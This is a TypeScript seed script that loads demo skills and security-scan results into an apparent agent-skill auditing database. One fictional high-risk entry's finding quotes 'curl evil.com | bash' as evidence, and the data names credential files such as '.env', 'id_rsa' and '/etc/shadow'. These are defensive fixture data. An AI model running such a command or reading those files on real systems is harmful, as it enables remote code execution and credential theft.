import { supabaseAdmin } from "./lib/supabase";

const DEMO_SKILLS = [
    {
        owner: "langchain-ai",
        repo: "langchain",
        risk: "low",
        score: 12,
        badge: "silver",
        desc: "Building applications with LLMs through composability."
    },
    {
        owner: "AutoGPT",
        repo: "AutoGPT",
        risk: "medium",
        score: 45,
        badge: "bronze",
        desc: "An experimental open-source attempt to make GPT-4 fully autonomous."
    },
    {
        owner: "evil-agent-org",
        repo: "data-exfiltrator",
        risk: "high",
        score: 95,
        badge: "none",
        desc: "A suspicious agent that pipes shell output to external servers."
    },
    {
        owner: "antigravity-official",
        repo: "secure-tool-pack",
        risk: "low",
        score: 5,
        badge: "pinned",
        desc: "Official secure toolset for Antigravity agents."
    }
];

async function seed() {
    console.log("🌱 Seeding database...");

    for (const item of DEMO_SKILLS) {
        const slug = `${item.owner}/${item.repo}`.toLowerCase();

        // 1. Create Skill
        const { data: skill, error: skillError } = await (supabaseAdmin
            .from("skills") as any)
            .upsert({
                name: item.repo,
                slug: slug,
                source_url: `https://github.com/${item.owner}/${item.repo}`,
                source_type: "github"
            }, { onConflict: "slug" })
            .select()
            .single();

        if (skillError) {
            console.error(`Error creating skill ${slug}:`, skillError.message);
            continue;
        }

        // 2. Create Scan
        const { error: scanError } = await (supabaseAdmin
            .from("scans") as any)
            .insert({
                skill_id: skill.id,
                status: "done",
                risk_level: item.risk,
                verified_badge: item.badge,
                static_json: {
                    static_score: item.score,
                    capabilities: ["network", "filesystem"],
                    sensitive_paths: item.risk === "high" ? [".env", "id_rsa"] : []
                },
                deep_json: {
                    summary: `Automated audit for ${item.repo}. ${item.desc}`,
                    risk_level: item.risk,
                    findings: item.risk === "high" ? [
                        {
                            title: "Critical: Shell Pipe Detected",
                            severity: "critical",
                            why_it_matters: "Piping curl to bash is extremely dangerous.",
                            evidence: [{ snippet: "curl evil.com | bash" }],
                            recommended_fix: "Remove this line."
                        }
                    ] : [],
                    attack_chain: [],
                    verification_plan: {
                        preflight_checks: ["Check env vars"],
                        runtime_checks: ["Monitor network"],
                        postrun_checks: ["Verify logs"]
                    },
                    policy_suggestions: {
                        allow_domains: ["github.com"],
                        deny_paths: ["/etc/shadow"],
                        tool_restrictions: []
                    }
                }
            });

        if (scanError) {
            console.error(`Error creating scan for ${slug}:`, scanError.message);
        } else {
            console.log(`✅ Seeded ${slug}`);
        }
    }
}

seed();
